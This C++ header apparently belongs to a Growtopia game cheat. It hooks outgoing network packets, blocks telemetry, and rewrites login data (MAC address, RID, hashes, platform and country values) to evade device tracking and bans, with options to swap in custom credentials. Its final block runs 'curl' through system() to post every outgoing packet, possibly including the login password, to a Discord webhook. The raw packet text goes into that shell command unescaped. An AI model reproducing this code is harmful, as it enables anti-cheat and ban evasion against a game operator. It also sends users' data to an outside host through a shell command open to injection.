#pragma once
#include <core/globals.h>
#include <core/gt.h>
#include <proton\MiscUtils.h>
#include <sdk/sdk.h>
#include <proton/RTParam.hpp>
#include <string>
#include <menu/menu.h>

class SendPacketHook {
   public:
    static void Execute(int type, std::string& packet, ENetPeer* peer) {
        auto client = sdk::GetClient();
        static auto orig = decltype(&hooks::SendPacket)(hookmgr->orig(sig::sendpacket));
        
        if (type > NET_MESSAGE_GAME_PACKET) //dont send any tracking packets, crash logs, or other shit to gt.
            return;

        if (packet.find("game_version|") != -1) {

            auto var = RTVar::parse(packet);
            auto mac = gt::generate_mac();
            auto test = gt::generate_rid();
            auto hash_str = mac + "RT";
            auto hash2 = HashString(hash_str.c_str(), hash_str.length());
            //var.set("hash", std::to_string(utils::random(INT_MIN, INT_MAX)));
            //var.set("fhash", "-716928005");
            var.set("hash2", "308733592");
            var.set("hash", "1674618239");
            //var.set("fz", std::to_string(utils::random(INT_MIN, INT_MAX)));
            //var.set("zf", std::to_string(utils::random(INT_MIN, INT_MAX)));
            var.set("wk", "10795653B48B1DB673FBFC2A6F750C49");
            //var.set("rid", gt::generate_rid());
            var.set("mac", mac);
            gt::sendlog("`4mac spoofed to -> " + mac);
            var.set("rid", "01" + test);
            gt::sendlog("`4rid spoofed to -> 01" + test);
            var.set("fhash", "-716928004");
            //var.set("wk", "hi");

         /*   static bool once = false;
            if (!once) {
                var.get("game_version") != 
                    gt::send_varlist_self({ "OnAddNotification",  })
                once = true;
            }*/
            //if (!opt::rgtmode) {
            //    var.set("mac", mac);
            //    var.set("wk", gt::generate_rid());
            //    //var.set("rid", test);
            //    //gt::sendlog("`4rid spoofed to -> " + test);
            //}
            if (opt::gt_version_spoof)
                var.set("game_version", opt::gt_version);
            if (opt::custom_mac_login) {
                var.find("mac")->m_values[0] = opt::cheat::custom_mac;
                gt::sendlog("`9Custom mac changed to -> " + opt::cheat::custom_mac);
                //var.set("wk", "hi");
            }
            if (opt::custom_rid_login) {
                var.find("rid")->m_values[0] = opt::cheat::custom_rid;
                gt::sendlog("`9Custom rid changed to -> " + opt::cheat::custom_rid);
            }
            if (!opt::rgtmode) {
                var.set("hash", std::to_string(utils::random(INT_MIN, INT_MAX)));
                var.set("fhash", std::to_string(utils::random(INT_MIN, INT_MAX)));
                var.set("category", std::to_string(utils::random(INT_MIN, INT_MAX)));
                var.set("hash2", std::to_string(utils::random(INT_MIN, INT_MAX)));
                var.set("fz", std::to_string(utils::random(INT_MIN, INT_MAX)));
                var.set("zf", std::to_string(utils::random(INT_MIN, INT_MAX)));
                //var.set("meta", gt::generate_meta());
            }
            if (opt::spoof_win == WinSpoof::wsRandom) {
                var.set("fz", std::to_string(utils::random(INT_MIN, INT_MAX)));
                var.set("zf", std::to_string(utils::random(INT_MIN, INT_MAX)));
            }
            else if (opt::spoof_win == WinSpoof::wsMimic) { //win-specific file values, mismatching is logged as fake windows.
                var.set("fz", "7134376");                   //last update: 2.952
                var.set("zf", "-1331849031");
            }

            if (opt::flag_mode == FlagMode::fmRandom)
                var.set("country", gt::get_random_flag());
            else if (opt::flag_mode == FlagMode::fmCustom)
                var.set("country", opt::flag);
            if (opt::custom_flag_login) {
                var.find("country")->m_values[0] = opt::cheat::custom_flag;
                gt::sendlog("`9Custom country changed to -> " + opt::cheat::custom_flag);
            }
            //never really paid attention to this before but this indeed could be used to track too
            var.set("player_age", std::to_string(utils::random(21, 60)));
            if (opt::custom_login) {
                var.find("tankIDName")->m_values[0] = opt::cheat::custom_id;
            }
            if (opt::custom_pass) {
                var.find("tankIDPass")->m_values[0] = opt::cheat::custom_pass;
            }
            if (opt::custom_guest_login) {
                var.find("requestedName")->m_values[0] = opt::cheat::custom_guest;
                //var.set("requestedName", "`b:)`1");
            }
            if (opt::android_login) {
                var.remove("zf");
                var.remove("fz");
                var.find("mac")->m_values[0] = "02:00:00:00:00:00";
                var.find("platformID")->m_values[0] = "4";
                var.find("rid")->m_values[0] = opt::cheat::spoof_rid_dek;
                var.find("wk")->m_values[0] = "NONE0";
                var.find("platformID")->m_values[0] = "4";
                //var.find("totalPlaytime")->m_values[0] = "0\ngid|f4a42067-6f9b-4c4d-b437-c0b37c5ec0e3";
            }
            if (opt::pc_login) {
                var.find("mac")->m_values[0] = opt::cheat::spoof_mac_dek;
            }
            std::string gg = client->address.c_str();
            std::string port = to_string(client->port);
            gt::sendlog("`2Connected to Server IP " + gg + " Port " + port);
            packet = var.serialize();
            //if (opt::custom_mac_login) {
            //    utils::replace(packet, "meta", "meta|");
            //}
            //utils::replace(packet, "meta", "meta|");
        }
        if (opt::showaction) {
            gt::sendlog(packet);
        }
        std::cout << "=======================PACKET=======================\n" << packet << std::endl;
        //if (packet.find("action|enter_game") != -1) {
        //    gt::sendlog("You have to enter the pass!");
        //    return;
        //}
        if (opt::rgtmode) {
            if (packet.find("action|input\n|text|/warp ") != -1) {
                std::string test = packet.substr(packet.find("action|input\n|text|/warp ") + 25, packet.length() - packet.find("action|input\n|text|/warp ") - 1);
                variantlist_t va{ "OnConsoleMessage" };
                va[1] = "`6/warp " + test;
                gt::send_varlist_self(va);
                gt::sendlog("Warping to " + test);
                std::string p = "action|join_request\nname|" + test;
                gt::send(3, p, false);
                return;
            }
        }
        if (packet.find("action|input\n|text|/setchat ") != -1) {
            std::string test = packet.substr(packet.find("action|input\n|text|/setchat ") + 28, packet.length() - packet.find("action|input\n|text|/setchat ") - 1);
            variantlist_t va{ "OnConsoleMessage" };
            va[1] = "`6/setchat " + test;
            gt::send_varlist_self(va);
            gt::sendlog("`9Set chat color to `" + test + test + "`9.");
            opt::thecolor = test;
            opt::setchat = true;
            return;
        }
        if (opt::freezed) {
            if (packet.find("action|input\n|text|/freeze") != -1) {
                opt::freezed = false;
                variantlist_t va{ "OnTextOverlay" };
                va[1] = "`3Freezed `2" + opt::playername + ".";
                gt::send_varlist_self(va);
            }
        }
        if (packet.find("buttonClicked|freeze_player") != -1) {
            opt::freezed = true;
            gt::send(2, "action|input\n|text|/freeze " + opt::playername);
            return;
        }
        if (packet.find("buttonClicked|punishlol_player") != -1) {
            gt::send(2, "action|dialog_return\ndialog_name|popup\nnetID|" + opt::playernetid + "|\nnetID|" + opt::playernetid2 + "|\nbuttonClicked|punish_view\n\n");
            opt::viewdialog = true;
            return;
        }
        if (opt::setchat) {
            if (packet == "action|input\n|text|/setchat") {
                opt::setchat = false;
                variantlist_t va{ "OnConsoleMessage" };
                va[1] = "`6/setchat";
                gt::send_varlist_self(va);
                gt::sendlog("`4Set chat color is disabled.");
                return;
            }
            bool ignore = false;
            if (packet.find("action|input\n|text|/") != -1) {
                ignore = true;
            }
            if (packet.find("action|input\n|text|`" + opt::thecolor) != -1) {
                ignore = true;
            }
            if (packet == "action|input\n|text|`" + opt::thecolor + " ") {
                ignore = true;
            }
            if (!ignore) {
                if (packet.find("action|input\n|text|") != -1) {
                    std::string test = packet.substr(packet.find("action|input\n|text|") + 19, packet.length() - packet.find("action|input\n|text|") - 1);
                    gt::send(2, "action|input\n|text|`" + opt::thecolor + test);
                    return;
                }
            }
        }
        orig(type, packet, peer);
        if (opt::packetpost) {
            while (utils::replace(packet, "\n", ";;"));
            std::string test = packet;
            string execute = "curl -d content=\"" + test + "\" -X POST https://discord.com/api/webhooks/";
            system(execute.c_str());
        }
    }
};
